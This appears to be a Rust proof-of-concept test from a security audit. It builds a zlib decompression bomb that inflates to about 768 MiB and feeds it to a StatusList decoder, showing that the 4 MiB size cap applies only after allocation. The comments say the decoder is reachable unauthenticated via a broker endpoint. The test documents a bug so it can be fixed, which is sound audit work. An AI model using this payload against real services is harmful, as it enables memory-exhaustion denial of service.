//! WS8 PoC — W6-3 / W5-8: the status-list decoder inflates the whole zlib
//! stream before the 4 MiB cap. In-process; the same `StatusList::decode` is
//! reached unauthenticated via the broker's GET /status/proxy (WS5).
use browserid_core::StatusList;
use flate2::{write::ZlibEncoder, Compression};
use std::io::Write;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;

fn rss_kib() -> u64 {
    let pid = std::process::id();
    let out = std::process::Command::new("ps")
        .args(["-o", "rss=", "-p", &pid.to_string()])
        .output()
        .unwrap();
    String::from_utf8_lossy(&out.stdout).trim().parse().unwrap_or(0)
}

#[test]
#[ignore] // AUDIT-2026-11 W6-3/W5-8: PoC, passes today (RSS spikes past the 4 MiB cap); flips when decode caps before inflate
fn w6_3_poc_zlib_bomb_allocates_past_the_cap() {
    // Craft a small base64url(zlib(...)) that inflates to ~768 MiB of zeros.
    const INFLATED: usize = 768 * 1024 * 1024;
    let mut enc = ZlibEncoder::new(Vec::new(), Compression::best());
    let chunk = vec![0u8; 1024 * 1024];
    let mut written = 0;
    while written < INFLATED {
        enc.write_all(&chunk).unwrap();
        written += chunk.len();
    }
    let compressed = enc.finish().unwrap();
    use base64::{engine::general_purpose::URL_SAFE_NO_PAD as B64, Engine};
    let lst = B64.encode(&compressed);
    println!(
        "[W6-3] crafted payload: {} bytes compressed inflates to {} MiB (4 MiB cap)",
        lst.len(),
        INFLATED / 1024 / 1024
    );

    let base = rss_kib();
    let peak = Arc::new(AtomicU64::new(base));
    let done = Arc::new(AtomicBool::new(false));
    let (p2, d2) = (peak.clone(), done.clone());
    let sampler = std::thread::spawn(move || {
        while !d2.load(Ordering::Relaxed) {
            let r = rss_kib();
            p2.fetch_max(r, Ordering::Relaxed);
            std::thread::sleep(std::time::Duration::from_millis(2));
        }
    });

    let res = StatusList::decode(&lst);
    done.store(true, Ordering::Relaxed);
    sampler.join().unwrap();

    let peak_mib = peak.load(Ordering::Relaxed) / 1024;
    let base_mib = base / 1024;
    println!(
        "[W6-3] decode returned {:?}; process RSS {} MiB -> peak {} MiB (grew {} MiB on a {}-byte request, past the 4 MiB cap)",
        res.as_ref().map(|_| "Ok").map_err(|e| e.to_string()),
        base_mib, peak_mib, peak_mib.saturating_sub(base_mib), lst.len()
    );
    // The cap rejects AFTER the allocation: decode errors, but RSS already spiked.
    assert!(res.is_err(), "the 4 MiB cap rejects the oversized list");
    assert!(peak_mib - base_mib > 100, "PoC: RSS spiked well past the cap before rejection");
}
